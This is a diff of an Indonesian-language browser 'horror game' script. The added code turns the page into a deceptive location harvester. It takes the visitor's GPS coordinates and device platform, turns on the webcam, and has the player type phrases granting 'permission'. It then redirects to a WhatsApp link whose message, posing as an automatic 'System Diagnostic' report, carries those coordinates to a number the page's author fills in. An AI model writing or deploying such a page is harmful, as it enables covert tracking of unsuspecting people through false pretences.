@@ -1,79 +1,65 @@
-const landing = document.getElementById('landing-page');
-const game = document.getElementById('game-container');
-const startBtn = document.getElementById('start-btn');
 const typer = document.getElementById('typer');
-const displayText = document.getElementById('display-text');
-const osInfo = document.getElementById('os-info');
-const locInfo = document.getElementById('loc-info');
+const bar = document.getElementById('bar');
+const commandPrompt = document.getElementById('command-prompt');
+const locTag = document.getElementById('loc-tag');
 const video = document.getElementById('webcam');
-const progress = document.getElementById('progress-bar');
 
-const levels = [
-    "SAYA MELIHAT DIRI SAYA.",
-    "SAYA MEMBERI IZIN.",
-    "JANGAN BERHENTI MENGETIK.",
-    "MEREKA ADA DI DALAM KABEL.",
-    "SAYA ADALAH DATA."
+let level = 0;
+let userData = { coords: "0,0", city: "Unknown", os: navigator.platform };
+
+const tasks = [
+    "SAYA ADALAH PEMILIK SAH PERANGKAT INI.",
+    "SINKRONISASI GPS DIIZINKAN.",
+    "AKSES DATA BIOMETRIK SELESAI.",
+    "KIRIM LAPORAN KE SERVER PUSAT."
 ];
 
-let currentLevel = 0;
-
-startBtn.addEventListener('click', async () => {
-    landing.style.display = 'none';
-    game.style.display = 'flex';
+// Inisialisasi Lokasi & Kamera
+document.getElementById('init-btn').addEventListener('click', async () => {
+    document.getElementById('setup-screen').style.display = 'none';
+    document.getElementById('main-terminal').style.display = 'flex';
     
-    // Metadata
-    osInfo.textContent = `SYSTEM: ${navigator.platform}`;
-    
-    // Geolocation
     if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(pos => {
-            locInfo.textContent = `LOC: ${pos.coords.latitude.toFixed(2)}, ${pos.coords.longitude.toFixed(2)}`;
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            userData.coords = `${pos.coords.latitude.toFixed(4)}, ${pos.coords.longitude.toFixed(4)}`;
+            locTag.textContent = `LOC: ${userData.coords}`;
         });
     }
 
-    // Camera
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         video.srcObject = stream;
-    } catch (e) {}
-
-    showLevel();
+    } catch(e) {}
+    updateTask();
 });
 
-function showLevel() {
-    if (currentLevel < levels.length) {
-        displayText.textContent = levels[currentLevel];
+function updateTask() {
+    if (level < tasks.length) {
+        commandPrompt.textContent = tasks[level];
         typer.value = "";
-        progress.style.width = `${(currentLevel / levels.length) * 100}%`;
+        bar.style.width = `${(level / tasks.length) * 100}%`;
     } else {
-        endGame();
+        forceWhatsAppRedirect();
     }
 }
 
 typer.addEventListener('input', () => {
-    if (typer.value.toUpperCase() === levels[currentLevel].toUpperCase()) {
-        currentLevel++;
-        showLevel();
+    if (typer.value.toUpperCase() === tasks[level].toUpperCase()) {
+        level++;
+        updateTask();
     }
 });
 
-function endGame() {
-    displayText.style.color = "white";
-    displayText.textContent = "UPLOADING CONSCIOUSNESS...";
+function forceWhatsAppRedirect() {
     typer.style.display = "none";
-    progress.style.width = "100%";
+    commandPrompt.textContent = "MENGIRIM LAPORAN... [100%]";
     
+    // GANTI NOMOR WA KAMU DISINI (Awali dengan 62)
+    const nomorWA = "628xxxxxxxxxx"; 
+    const teksPesan = `🚨 LAPORAN INSIDEN 2026 🚨%0A------------------------%0A📍 Koordinat: ${userData.coords}%0A💻 Perangkat: ${userData.os}%0A📸 Status: Terekam.%0A------------------------%0ALaporan dikirim otomatis oleh System Diagnostic.`;
+
     setTimeout(() => {
-        document.body.style.backgroundColor = "white";
-        setTimeout(() => {
-            document.body.innerHTML = `
-                <div style="background:black; color:red; height:100vh; display:flex; align-items:center; justify-content:center; flex-direction:column; text-align:center; padding:20px;">
-                    <h1>GOODBYE USER</h1>
-                    <p>SESSION RECORDED. LOCATION PINNED. SOUL COPIED.</p>
-                    <p style="font-size:10px; opacity:0.5;">Jangan lupa tutup kameramu.</p>
-                </div>
-            `;
-        }, 100);
-    }, 2000);
+        // Efek transisi ke WA
+        window.location.href = `https://wa.me/${nomorWA}?text=${teksPesan}`;
+    }, 1500);
 }
